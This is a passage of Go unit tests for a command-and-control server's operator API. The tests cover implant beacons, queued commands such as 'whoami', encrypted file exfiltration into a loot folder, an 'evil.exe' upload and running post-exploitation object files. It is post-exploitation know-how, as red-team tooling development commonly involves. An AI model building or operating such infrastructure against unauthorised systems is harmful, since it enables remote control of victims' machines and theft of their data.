	w := httptest.NewRecorder()
	h.HandleResult(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleQueueTask_RunCommand(t *testing.T) {
	h, s, _ := setup(t)
	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 5, SessionKey: sessionKey, Sleep: 5})

	body := strings.NewReader(`{"beacon_id":5,"type":12,"code":0,"args":"whoami"}`)
	req := httptest.NewRequest("POST", "/api/task", body)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp struct {
		Label uint32 `json:"label"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp.Label == 0 {
		t.Fatal("expected non-zero label")
	}

	task := s.GetNextTask(5)
	if task == nil {
		t.Fatal("expected task in queue")
	}
	if task.Type != 12 {
		t.Fatalf("expected type 12, got %d", task.Type)
	}
}

func TestHandleQueueTaskRedactsSensitiveArgsInEventLog(t *testing.T) {
	h, s, _ := setup(t)
	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 55, SessionKey: sessionKey, Sleep: 5})

	body := strings.NewReader(`{"beacon_id":55,"type":12,"code":0,"args":"login --password swordfish token=abcd1234"}`)
	req := httptest.NewRequest("POST", "/api/task", body)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	h.HandleQueueTask(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	events := s.ListEvents()
	if len(events) != 1 {
		t.Fatalf("events = %d, want 1", len(events))
	}
	if strings.Contains(events[0].Message, "swordfish") || strings.Contains(events[0].Message, "abcd1234") {
		t.Fatalf("sensitive args leaked in event: %q", events[0].Message)
	}
	if !strings.Contains(events[0].Message, "[redacted]") {
		t.Fatalf("event missing redaction marker: %q", events[0].Message)
	}
}

func TestHandleQueueTask_UnknownBeacon(t *testing.T) {
	h, _, _ := setup(t)
	body := strings.NewReader(`{"beacon_id":9999,"type":12,"code":0,"args":"whoami"}`)
	req := httptest.NewRequest("POST", "/api/task", body)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleQueueTask_BadJSON(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("POST", "/api/task", strings.NewReader("not json"))
	w := httptest.NewRecorder()
	h.HandleQueueTask(w, req)

	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleTerminal_RoundTripsFileBrowserCache(t *testing.T) {
	h, _, _ := setup(t)
	body := strings.NewReader(`{
		"output_log":[{"text":"ready","cls":"hint"}],
		"cmd_history":["pwd"],
		"poll_since":123,
		"file_browser":{
			"tree":{"C:\\":{"entries":[{"name":"Temp","type":"dir"}]}},
			"expanded":["C:\\"],
			"selected":"C:\\Temp",
			"root":"C:\\",
			"sep":"\\",
			"saved_at":1700000000
		},
		"session_file_browser":{
			"tree":{"C:\\":{"entries":[{"name":"Windows","type":"dir"}]}},
			"expanded":["C:\\"],
			"selected":"C:\\Windows",
			"root":"C:\\",
			"sep":"\\",
			"saved_at":1700000001
		}
	}`)
	putReq := httptest.NewRequest(http.MethodPut, "/api/terminal/5", body)
	putReq.SetPathValue("id", "5")
	putW := httptest.NewRecorder()
	h.HandlePutTerminal(putW, putReq)
	if putW.Code != http.StatusNoContent {
		t.Fatalf("expected 204, got %d: %s", putW.Code, putW.Body.String())
	}

	getReq := httptest.NewRequest(http.MethodGet, "/api/terminal/5", nil)
	getReq.SetPathValue("id", "5")
	getW := httptest.NewRecorder()
	h.HandleGetTerminal(getW, getReq)
	if getW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", getW.Code)
	}

	var got models.TerminalState
	if err := json.NewDecoder(getW.Body).Decode(&got); err != nil {
		t.Fatalf("decode terminal state: %v", err)
	}
	if got.FileBrowser == nil || got.SessionFileBrowser == nil {
		t.Fatalf("expected both file browser caches, got %#v", got)
	}
	if got.FileBrowser.Selected != `C:\Temp` {
		t.Fatalf("file browser selected = %q", got.FileBrowser.Selected)
	}
	if got.SessionFileBrowser.Selected != `C:\Windows` {
		t.Fatalf("session file browser selected = %q", got.SessionFileBrowser.Selected)
	}
	if got.FileBrowser.Tree[`C:\`].Entries[0]["name"] != "Temp" {
		t.Fatalf("file browser tree mismatch: %#v", got.FileBrowser.Tree)
	}
}

func TestHandleGetSessions_ReturnsJSON(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 10, SessionKey: make([]byte, 32), Hostname: "box1", Sleep: 60})
	s.RegisterBeacon(&models.ImplantMetadata{ID: 11, SessionKey: make([]byte, 32), Hostname: "box2", Sleep: 60})

	req := httptest.NewRequest("GET", "/api/sessions", nil)
	w := httptest.NewRecorder()
	h.HandleGetSessions(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		ID uint32 `json:"id"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 2 {
		t.Fatalf("expected 2 beacons, got %d", len(resp))
	}
}

func TestHandleGetResults_ReturnsSince(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 20, SessionKey: make([]byte, 32), Sleep: 60})
	s.StoreResult(&models.Result{Label: 1, BeaconID: 20, Output: "root", ReceivedAt: time.Now()})

	req := httptest.NewRequest("GET", "/api/results/20?since=0", nil)
	req.SetPathValue("id", "20")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		Output string `json:"output"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 1 {
		t.Fatalf("expected 1 result, got %d", len(resp))
	}
	if resp[0].Output != "root" {
		t.Fatalf("expected root, got %q", resp[0].Output)
	}
}

func TestHandleGetResults_LegacyRunShapeStillDecodes(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 22, SessionKey: make([]byte, 32), Sleep: 60})
	receivedAt := time.Unix(1700000100, 0).UTC()
	s.StoreResult(&models.Result{
		Label:      4,
		BeaconID:   22,
		Flags:      2,
		Type:       protocol.TaskRun,
		Output:     "operator\n",
		ReceivedAt: receivedAt,
	})

	req := httptest.NewRequest(http.MethodGet, "/api/results/22?since=0", nil)
	req.SetPathValue("id", "22")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		Label      uint32 `json:"label"`
		BeaconID   uint32 `json:"beacon_id"`
		Flags      uint16 `json:"flags"`
		Type       uint8  `json:"type"`
		Output     string `json:"output"`
		ReceivedAt int64  `json:"received_at"`
	}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Decode: %v", err)
	}
	if len(resp) != 1 {
		t.Fatalf("expected 1 result, got %d", len(resp))
	}
	if resp[0].Label != 4 || resp[0].BeaconID != 22 || resp[0].Flags != 2 || resp[0].Type != protocol.TaskRun {
		t.Fatalf("legacy fields mismatch: %#v", resp[0])
	}
	if resp[0].Output != "operator\n" || resp[0].ReceivedAt != receivedAt.Unix() {
		t.Fatalf("legacy payload mismatch: %#v", resp[0])
	}
}

func TestHandleGetResults_InlineAssemblyIncludesStructuredFields(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 21, SessionKey: make([]byte, 32), Sleep: 60})
	s.StoreResult(&models.Result{
		Label:         8,
		BeaconID:      21,
		Flags:         5,
		Type:          protocol.TaskInlineAssembly,
		Output:        "legacy output",
		ExitCode:      -3,
		Stdout:        "stdout text",
		Stderr:        "stderr text",
		Exception:     "exception text",
		DurationMS:    4567,
		Truncated:     true,
		Mode:          "direct",
		BridgeVersion: "2.0.0",
		Diagnostics:   "diag text",
		ReceivedAt:    time.Unix(1700000000, 0).UTC(),
	})

	req := httptest.NewRequest(http.MethodGet, "/api/results/21?since=0", nil)
	req.SetPathValue("id", "21")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	var resp []struct {
		Label         uint32 `json:"label"`
		BeaconID      uint32 `json:"beacon_id"`
		Flags         uint16 `json:"flags"`
		Type          uint8  `json:"type"`
		Output        string `json:"output"`
		ExitCode      int32  `json:"exit_code"`
		Stdout        string `json:"stdout"`
		Stderr        string `json:"stderr"`
		Exception     string `json:"exception"`
		DurationMS    uint32 `json:"duration_ms"`
		Truncated     bool   `json:"truncated"`
		Mode          string `json:"mode"`
		BridgeVersion string `json:"bridge_version"`
		Diagnostics   string `json:"diagnostics"`
		ReceivedAt    int64  `json:"received_at"`
	}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Decode: %v", err)
	}
	if len(resp) != 1 {
		t.Fatalf("expected 1 result, got %d", len(resp))
	}

	got := resp[0]
	if got.Label != 8 || got.BeaconID != 21 || got.Flags != 5 || got.Type != protocol.TaskInlineAssembly {
		t.Fatalf("identity mismatch: %#v", got)
	}
	if got.Output != "legacy output" || got.ExitCode != -3 || got.Stdout != "stdout text" || got.Stderr != "stderr text" {
		t.Fatalf("text fields mismatch: %#v", got)
	}
	if got.Exception != "exception text" || got.DurationMS != 4567 || !got.Truncated {
		t.Fatalf("metadata mismatch: %#v", got)
	}
	if got.Mode != "direct" || got.BridgeVersion != "2.0.0" || got.Diagnostics != "diag text" {
		t.Fatalf("mode fields mismatch: %#v", got)
	}
	if got.ReceivedAt != 1700000000 {
		t.Fatalf("received_at = %d, want %d", got.ReceivedAt, int64(1700000000))
	}
}

func TestHandleGetResults_FutureSince(t *testing.T) {
	h, s, _ := setup(t)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 30, SessionKey: make([]byte, 32), Sleep: 60})
	s.StoreResult(&models.Result{Label: 2, BeaconID: 30, Output: "data", ReceivedAt: time.Now()})

	futureTs := time.Now().Add(time.Hour).Unix()
	req := httptest.NewRequest("GET", fmt.Sprintf("/api/results/30?since=%d", futureTs), nil)
	req.SetPathValue("id", "30")
	w := httptest.NewRecorder()
	h.HandleGetResults(w, req)

	var resp []struct {
		Output string `json:"output"`
	}
	json.NewDecoder(w.Body).Decode(&resp)
	if len(resp) != 0 {
		t.Fatalf("expected 0 results with future since, got %d", len(resp))
	}
}

func TestHandleKillBeacon_queuesKillTask(t *testing.T) {
	h := newTestHandler(t)
	h.store.RegisterBeacon(&models.ImplantMetadata{
		ID: 42, SessionKey: make([]byte, 32), Sleep: 5,
	})

	req := httptest.NewRequest("DELETE", "/api/sessions/42", nil)
	req.SetPathValue("id", "42")
	w := httptest.NewRecorder()
	h.HandleKillBeacon(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204 NoContent, got %d", w.Code)
	}

	task := h.store.GetNextTask(42)
	if task == nil {
		t.Fatal("kill task must be queued")
	}
	if task.Type != protocol.TaskExit {
		t.Fatalf("expected TaskExit (%d), got %d", protocol.TaskExit, task.Type)
	}
	if task.Code != protocol.CodeExitNormal {
		t.Fatalf("expected CodeExitNormal (%d), got %d", protocol.CodeExitNormal, task.Code)
	}
}

func TestHandleKillBeacon_deleteRequestedRemovesBeacon(t *testing.T) {
	h := newTestHandler(t)
	now := time.Now()
	h.store.LoadBeacons([]*models.Beacon{{
		ImplantMetadata: models.ImplantMetadata{
			ID:         43,
			SessionKey: make([]byte, 32),
			Sleep:      60,
			Hostname:   "old-host",
		},
		FirstSeen: now,
		LastSeen:  now,
	}})

	req := httptest.NewRequest("DELETE", fmt.Sprintf("/api/sessions/43?delete=1&action=delete&last_seen=%d", now.Unix()), nil)
	req.SetPathValue("id", "43")
	w := httptest.NewRecorder()
	h.HandleKillBeacon(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("expected 204 NoContent, got %d: %s", w.Code, w.Body.String())
	}
	if b := h.store.GetBeacon(43); b != nil {
		t.Fatal("beacon must be deleted")
	}
	if task := h.store.GetNextTask(43); task != nil {
		t.Fatalf("delete must not queue kill task, got %#v", task)
	}
}

func TestHandleKillBeacon_unknownBeacon(t *testing.T) {
	h := newTestHandler(t)
	req := httptest.NewRequest("DELETE", "/api/sessions/999", nil)
	req.SetPathValue("id", "999")
	w := httptest.NewRecorder()
	h.HandleKillBeacon(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404 for unknown beacon, got %d", w.Code)
	}
}

func TestHandleCheckin_autoRemovesBeaconAfterKillTask(t *testing.T) {
	h := newTestHandler(t)

	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, sessionKey); err != nil {
		t.Fatal(err)
	}

	h.store.RegisterBeacon(&models.ImplantMetadata{
		ID:         55,
		SessionKey: sessionKey,
		Sleep:      5,
	})
	h.store.QueueTask(&models.Task{
		Label:     9999,
		BeaconID:  55,
		Type:      protocol.TaskExit,
		Code:      protocol.CodeExitNormal,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	})

	// Checkin body: 4-byte little-endian beacon ID
	body := make([]byte, 4)
	binary.LittleEndian.PutUint32(body, 55)
	req := httptest.NewRequest(http.MethodPost, "/api/checkin", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCheckin(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 from checkin, got %d: %s", w.Code, w.Body.String())
	}
	if h.store.GetBeacon(55) != nil {
		t.Fatal("beacon must be removed from store after kill task delivery")
	}
}

func TestHandleListListeners_Default(t *testing.T) {
	h, s, _ := setup(t)
	s.AddListener(&models.Listener{
		Name: "default-http", Scheme: "http", Host: "127.0.0.1",
		BindAddr: "0.0.0.0", Port: 8080, IsDefault: true,
	})

	req := httptest.NewRequest("GET", "/api/listeners", nil)
	w := httptest.NewRecorder()
	h.HandleListListeners(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var resp []map[string]interface{}
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(resp) != 1 {
		t.Fatalf("expected 1 listener, got %d", len(resp))
	}
	if resp[0]["scheme"] != "http" {
		t.Fatalf("expected http scheme, got %v", resp[0]["scheme"])
	}
}

func TestHandleCreateListener_HTTP(t *testing.T) {
	h, s, _ := setup(t)
	body := `{"name":"extra","scheme":"http","host":"10.0.0.1","port":9001}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)

	if w.Code != 201 {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]interface{}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["id"] == nil {
		t.Fatal("expected id in response")
	}
	if len(s.ListListeners()) != 1 {
		t.Fatalf("expected 1 listener in store, got %d", len(s.ListListeners()))
	}
}

func TestHandleCreateListener_InvalidScheme(t *testing.T) {
	h, _, _ := setup(t)
	body := `{"name":"bad","scheme":"ftp","host":"10.0.0.1","port":21}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)
	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleCreateListener_MissingHost(t *testing.T) {
	h, _, _ := setup(t)
	body := `{"name":"nohost","scheme":"http","port":9002}`
	req := httptest.NewRequest("POST", "/api/listeners", strings.NewReader(body))
	w := httptest.NewRecorder()
	h.HandleCreateListener(w, req)
	if w.Code != 400 {
		t.Fatalf("expected 400, got %d", w.Code)
	}
}

func TestHandleDeleteListener_Default(t *testing.T) {
	h, s, _ := setup(t)
	s.AddListener(&models.Listener{
		Name: "default-http", Scheme: "http", Host: "127.0.0.1",
		Port: 8080, IsDefault: true,
	})
	id := s.ListListeners()[0].ID

	req := httptest.NewRequest("DELETE", fmt.Sprintf("/api/listeners/%d", id), nil)
	req.SetPathValue("id", fmt.Sprintf("%d", id))
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)

	if w.Code != 403 {
		t.Fatalf("expected 403 for default listener, got %d", w.Code)
	}
}

func TestHandleDeleteListener_NotFound(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("DELETE", "/api/listeners/9999", nil)
	req.SetPathValue("id", "9999")
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)
	if w.Code != 404 {
		t.Fatalf("expected 404, got %d", w.Code)
	}
}

func TestHandleDeleteListener_OK(t *testing.T) {
	h, s, _ := setup(t)
	l := &models.Listener{Name: "extra", Scheme: "http", Host: "10.0.0.1", Port: 9005}
	s.AddListener(l)

	req := httptest.NewRequest("DELETE", fmt.Sprintf("/api/listeners/%d", l.ID), nil)
	req.SetPathValue("id", fmt.Sprintf("%d", l.ID))
	w := httptest.NewRecorder()
	h.HandleDeleteListener(w, req)

	if w.Code != 204 {
		t.Fatalf("expected 204, got %d", w.Code)
	}
	if s.GetListener(l.ID) != nil {
		t.Fatal("listener still in store after delete")
	}
}

func TestHandleResultExfil(t *testing.T) {
	loot := t.TempDir()
	t.Setenv("BEBOP_LOOT_DIR", loot)

	h, _, _ := setup(t)

	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	h.store.RegisterBeacon(&models.ImplantMetadata{ID: 55, SessionKey: sessionKey, Sleep: 5})

	// Build a single-fragment exfil result payload:
	// header: Type=4, Code=0, Flags=FlagLastFragment(8), Label=77, Identifier=0, Length=...
	// data: [uint16 name_len=3]["out"]["HELLO"]
	data := []byte{3, 0, 'o', 'u', 't', 'H', 'E', 'L', 'L', 'O'}
	hdr := protocol.TaskHeader{
		Type:       protocol.TaskFileExfil,
		Flags:      protocol.FlagLastFragment,
		Label:      77,
		Identifier: 0,
		Length:     uint32(len(data)),
	}
	plain := append(protocol.EncodeHeader(hdr), data...)
	enc, err := protocol.Encrypt(sessionKey, plain)
	if err != nil {
		t.Fatal(err)
	}
	body := make([]byte, 4+len(enc))
	binary.LittleEndian.PutUint32(body[:4], uint32(55))
	copy(body[4:], enc)

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/api/result", bytes.NewReader(body))
	h.HandleResult(w, r)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	results := h.store.GetResults(55)
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].Type != protocol.TaskFileExfil {
		t.Fatalf("expected Type=4, got %d", results[0].Type)
	}
	if results[0].Filename != "out" {
		t.Fatalf("expected Filename 'out', got %q", results[0].Filename)
	}

	diskPath := filepath.Join(loot, "77_out")
	diskData, err := os.ReadFile(diskPath)
	if err != nil {
		t.Fatalf("expected secure loot file on disk: %v", err)
	}
	if string(diskData) != "HELLO" {
		t.Fatalf("expected disk content 'HELLO', got %q", string(diskData))
	}
	info, err := os.Stat(diskPath)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0600 {
		t.Fatalf("expected loot file mode 0600, got %v", info.Mode().Perm())
	}
}

func TestHandleUpload(t *testing.T) {
	h, beacon, _ := setupTestHandler(t)

	// Build a multipart body with 3 bytes (fits in one chunk)
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	_ = mw.WriteField("beacon_id", fmt.Sprintf("%d", beacon.ID))
	_ = mw.WriteField("dest_path", `C:\Temp\evil.exe`)
	fw, _ := mw.CreateFormFile("file", "evil.exe")
	_, _ = fw.Write([]byte{0xDE, 0xAD, 0xBE})
	mw.Close()

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/api/upload", &buf)
	r.Header.Set("Content-Type", mw.FormDataContentType())
	h.HandleUpload(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["chunks"].(float64) != 1 {
		t.Fatalf("expected 1 chunk, got %v", resp["chunks"])
	}

	task := h.store.GetNextTask(beacon.ID)
	if task == nil {
		t.Fatal("expected a queued task")
	}
	if task.Type != protocol.TaskFileStage {
		t.Fatalf("expected Type=3, got %d", task.Type)
	}
	if task.Flags != protocol.FlagLastFragment {
		t.Fatalf("expected FlagLastFragment, got %d", task.Flags)
	}
	// Fragment 0 data layout: [uint16 path_len][path_bytes][file_bytes]
	if len(task.Data) < 2 {
		t.Fatal("task.Data too short")
	}
	pathLen := int(task.Data[0]) | int(task.Data[1])<<8
	path := string(task.Data[2 : 2+pathLen])
	if path != `C:\Temp\evil.exe` {
		t.Fatalf("expected path 'C:\\Temp\\evil.exe', got %q", path)
	}
	chunk := task.Data[2+pathLen:]
	if !bytes.Equal(chunk, []byte{0xDE, 0xAD, 0xBE}) {
		t.Fatalf("expected chunk {0xDE,0xAD,0xBE}, got %v", chunk)
	}
}

func TestHandleGetDeleteFile(t *testing.T) {
	loot := t.TempDir()
	t.Setenv("BEBOP_LOOT_DIR", loot)
	h, _, _ := setupTestHandler(t)

	// Pre-seed the exfil store and write a temp file
	h.store.MarkExfilDone(55, "secret.txt", 1, 8)
	if err := os.MkdirAll(loot, 0700); err != nil {
		t.Fatal(err)
	}
	diskPath := filepath.Join(loot, "55_secret.txt")
	os.WriteFile(diskPath, []byte("treasure"), 0600)

	// GET /api/files/55
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, "/api/files/55", nil)
	r.SetPathValue("label", "55")
	h.HandleGetFile(w, r)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if w.Body.String() != "treasure" {
		t.Fatalf("expected 'treasure', got %q", w.Body.String())
	}

	// DELETE /api/files/55
	w2 := httptest.NewRecorder()
	r2 := httptest.NewRequest(http.MethodDelete, "/api/files/55", nil)
	r2.SetPathValue("label", "55")
	h.HandleDeleteFile(w2, r2)
	if w2.Code != http.StatusNoContent {
		t.Fatalf("expected 204, got %d", w2.Code)
	}
	if h.store.GetExfilFile(55) != nil {
		t.Fatal("expected nil after delete")
	}
	if _, err := os.Stat(diskPath); !os.IsNotExist(err) {
		t.Fatal("expected file to be removed from disk")
	}
}

func TestHandleLibraryUploadStoresBOFAndAssemblyByExtension(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	wObj := httptest.NewRecorder()
	h.HandleLibraryUpload(wObj, newLibraryUploadRequest(t, "", "smoke.obj", obj))
	if wObj.Code != http.StatusOK {
		t.Fatalf("BOF upload status = %d body = %q", wObj.Code, wObj.Body.String())
	}

	wExe := httptest.NewRecorder()
	h.HandleLibraryUpload(wExe, newLibraryUploadRequest(t, "Seatbelt.exe", "ignored.bin", []byte("MZ")))
	if wExe.Code != http.StatusOK {
		t.Fatalf("assembly upload status = %d body = %q", wExe.Code, wExe.Body.String())
	}

	wList := httptest.NewRecorder()
	h.HandleLibraryList(wList, httptest.NewRequest(http.MethodGet, "/api/library", nil))
	if wList.Code != http.StatusOK {
		t.Fatalf("list status = %d", wList.Code)
	}
	var entries []models.LibraryEntry
	if err := json.Unmarshal(wList.Body.Bytes(), &entries); err != nil {
		t.Fatalf("json decode: %v", err)
	}
	byName := map[string]models.LibraryEntry{}
	for _, e := range entries {
		byName[e.Name] = e
	}
	if byName["smoke.obj"].Kind != "bof" {
		t.Fatalf("smoke.obj kind = %q", byName["smoke.obj"].Kind)
	}
	if byName["Seatbelt.exe"].Kind != "assembly" {
		t.Fatalf("Seatbelt.exe kind = %q", byName["Seatbelt.exe"].Kind)
	}
}

func TestHandleLibraryListSeparatesBuiltinAndOperator(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	builtinDir := t.TempDir()
	t.Setenv("BEBOP_BUILTIN_BOF_DIR", builtinDir)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	if err := os.WriteFile(filepath.Join(builtinDir, "ldapsearch.x64.o"), obj, 0600); err != nil {
		t.Fatal(err)
	}
	manifest := `[{"name":"ldapsearch","file":"ldapsearch.x64.o","kind":"bof","source":"builtin","description":"LDAP search","usage":"ldapsearch [args]","tags":["ldap"]}]`
	if err := os.WriteFile(filepath.Join(builtinDir, "manifest.json"), []byte(manifest), 0600); err != nil {
		t.Fatal(err)
	}

	wOp := httptest.NewRecorder()
	h.HandleLibraryUpload(wOp, newLibraryUploadRequest(t, "", "custom.obj", obj))
	if wOp.Code != http.StatusOK {
		t.Fatalf("operator upload status = %d: %s", wOp.Code, wOp.Body.String())
	}

	w := httptest.NewRecorder()
	h.HandleLibraryList(w, httptest.NewRequest(http.MethodGet, "/api/library", nil))
	if w.Code != http.StatusOK {
		t.Fatalf("list status = %d", w.Code)
	}
	var entries []models.LibraryEntry
	if err := json.Unmarshal(w.Body.Bytes(), &entries); err != nil {
		t.Fatal(err)
	}
	byName := map[string]models.LibraryEntry{}
	for _, e := range entries {
		byName[e.Name] = e
	}
	if byName["ldapsearch"].Source != "builtin" || byName["ldapsearch"].Deletable {
		t.Fatalf("builtin metadata mismatch: %#v", byName["ldapsearch"])
	}
	if byName["custom.obj"].Source != "operator" || !byName["custom.obj"].Deletable {
		t.Fatalf("operator metadata mismatch: %#v", byName["custom.obj"])
	}
}

func TestHandleLibraryUploadRejectsUnsupportedExtension(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())

	w := httptest.NewRecorder()
	h.HandleLibraryUpload(w, newLibraryUploadRequest(t, "", "notes.txt", []byte("nope")))
	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", w.Code)
	}
}

func TestHandleLibraryDeleteRemovesStoredObject(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	wUpload := httptest.NewRecorder()
	h.HandleLibraryUpload(wUpload, newLibraryUploadRequest(t, "", "delete-me.o", obj))
	if wUpload.Code != http.StatusOK {
		t.Fatalf("upload status = %d", wUpload.Code)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/library/delete-me.o", nil)
	req.SetPathValue("name", "delete-me.o")
	wDelete := httptest.NewRecorder()
	h.HandleLibraryDelete(wDelete, req)
	if wDelete.Code != http.StatusNoContent {
		t.Fatalf("delete status = %d", wDelete.Code)
	}

	wList := httptest.NewRecorder()
	h.HandleLibraryList(wList, httptest.NewRequest(http.MethodGet, "/api/library", nil))
	var entries []models.LibraryEntry
	if err := json.Unmarshal(wList.Body.Bytes(), &entries); err != nil {
		t.Fatalf("json decode: %v", err)
	}
	for _, e := range entries {
		if e.Name == "delete-me.o" {
			t.Fatal("deleted object still listed")
		}
	}
}

func TestHandleBOFExecutesStoredObjectByName(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	registerTestBeaconWithArch(t, h, 77, 2, 1)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	wUpload := httptest.NewRecorder()
	h.HandleLibraryUpload(wUpload, newLibraryUploadRequest(t, "", "stored.obj", obj))
	if wUpload.Code != http.StatusOK {
		t.Fatalf("upload status = %d", wUpload.Code)
	}

	req := newBOFNameRequest(t, map[string]string{
		"beacon_id":   "77",
		"object_name": "stored.obj",
		"args":        "alpha beta",
	})
	w := httptest.NewRecorder()
	h.HandleBOF(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("bof status = %d body = %q", w.Code, w.Body.String())
	}

	task := h.store.GetNextTask(77)
	if task == nil {
		t.Fatal("expected queued task")
	}
	gotObj, gotArgs := decodeBOFReqForTest(t, task.Data)
	if !bytes.Equal(gotObj, obj) {
		t.Fatalf("object bytes mismatch")
	}
	if len(gotArgs) == 0 {
		t.Fatalf("expected packed args")
	}
}

func TestHandleBOFExecutesBuiltinObjectByAlias(t *testing.T) {
	h, _, _ := setup(t)
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	builtinDir := t.TempDir()
	t.Setenv("BEBOP_BUILTIN_BOF_DIR", builtinDir)
	registerTestBeaconWithArch(t, h, 77, 2, 1)

	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)
	if err := os.WriteFile(filepath.Join(builtinDir, "ldapsearch.x64.o"), obj, 0600); err != nil {
		t.Fatal(err)
	}
	manifest := `[{"name":"ldapsearch","file":"ldapsearch.x64.o","kind":"bof","source":"builtin"}]`
	if err := os.WriteFile(filepath.Join(builtinDir, "manifest.json"), []byte(manifest), 0600); err != nil {
		t.Fatal(err)
	}

	req := newBOFNameRequest(t, map[string]string{
		"beacon_id":   "77",
		"object_name": "ldapsearch",
		"args":        "(objectClass=*) cn",
	})
	w := httptest.NewRecorder()
	h.HandleBOF(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("bof status = %d body = %q", w.Code, w.Body.String())
	}

	task := h.store.GetNextTask(77)
	if task == nil {
		t.Fatal("expected queued task")
	}
	gotObj, gotArgs := decodeBOFReqForTest(t, task.Data)
	if !bytes.Equal(gotObj, obj) {
		t.Fatalf("object bytes mismatch")
	}
